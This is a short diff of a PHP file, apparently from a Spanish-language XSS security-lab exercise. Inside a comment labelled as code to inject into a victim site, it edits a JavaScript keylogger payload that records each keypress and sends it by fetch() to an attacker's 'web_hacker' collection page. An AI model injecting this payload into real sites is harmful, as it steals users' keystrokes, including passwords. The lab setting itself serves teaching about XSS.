@@ -9,6 +9,6 @@
     }
 
     /* Código a inyectar en la web víctima
-    <script>document.onkeypress = function(evt) {evt = evt || window.event;const key = String.fromCharCode(evt.charCode);if (key) {const param = encodeURI(key);fetch('http://localhost/programasphp_repos/9.Seguridad_Ataque_XSS/web_hacker/index.php', {method: 'POST',headers: {'Content-type': 'application/x-www-form-urlencoded'},body: 'key=' + param});}};</script>
+    <script>document.onkeypress = function(evt) {evt = evt || window.event;const key = String.fromCharCode(evt.charCode);if (key) {const param = encodeURI(key);fetch('../web_hacker/index.php', {method: 'POST',headers: {'Content-type': 'application/x-www-form-urlencoded'},body: 'key=' + param});}};</script>
     */
 ?>
